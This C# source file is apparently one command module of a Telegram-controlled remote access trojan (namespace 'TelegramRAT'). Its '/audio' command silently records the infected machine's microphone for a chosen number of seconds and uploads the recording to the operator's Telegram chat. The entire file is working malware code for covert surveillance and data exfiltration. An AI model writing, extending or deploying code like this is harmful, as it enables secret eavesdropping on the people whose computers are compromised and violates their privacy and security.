using Telegram.Bot;
using NAudio.Wave;
using Telegram.Bot.Types.Enums;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.Remote;

public class AudioCommand(ITelegramBotClient botClient, IBotNotificationService notificationService) : AbstractBotCommand
{
    public override string Command => "audio";
    public override int ArgsCount => 1;
    public override string Description => "Record audio from microphone for given amount of secs.";
    public override string Example => "/audio 50";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            if (WaveInEvent.DeviceCount == 0)
            {
                await botClient.SendMessage(model.Message.Chat.Id, "This machine has no audio input devices.", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                return;
            }

            if (!uint.TryParse(model.Args[0], out uint recordLength))
            {
                await botClient.SendMessage(model.Message.Chat.Id, "Argument must be a positive integer!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                return;
            }

            using WaveInEvent waveIn = new WaveInEvent { WaveFormat = new WaveFormat(44100, 1) };
            using MemoryStream memstrm = new MemoryStream();
            using WaveFileWriter waveFileWriter = new WaveFileWriter(memstrm, waveIn.WaveFormat);

            var tcs = new TaskCompletionSource<bool>();
            waveIn.RecordingStopped += (_, _) => tcs.TrySetResult(true);

            waveIn.DataAvailable += (_, args) =>
            {
                waveFileWriter.Write(args.Buffer, 0, args.BytesRecorded);
            };

            waveIn.StartRecording();
            await botClient.SendMessage(model.Message.Chat.Id, "Start recording", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
            await botClient.SendChatAction(model.Message.Chat.Id, ChatAction.RecordVoice);

            await Task.Delay(TimeSpan.FromSeconds(recordLength));

            waveIn.StopRecording();
            await tcs.Task;

            waveFileWriter.Flush();
            memstrm.Position = 0;

            await botClient.SendVoice(model.Message.Chat.Id, new Telegram.Bot.Types.InputFileStream(memstrm, "record"), replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
